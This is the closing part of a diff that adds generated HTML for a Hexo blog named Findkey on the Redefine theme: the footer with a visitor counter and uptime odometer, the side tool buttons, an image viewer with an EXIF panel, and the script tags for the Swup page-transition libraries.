+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Findkey</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        12 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
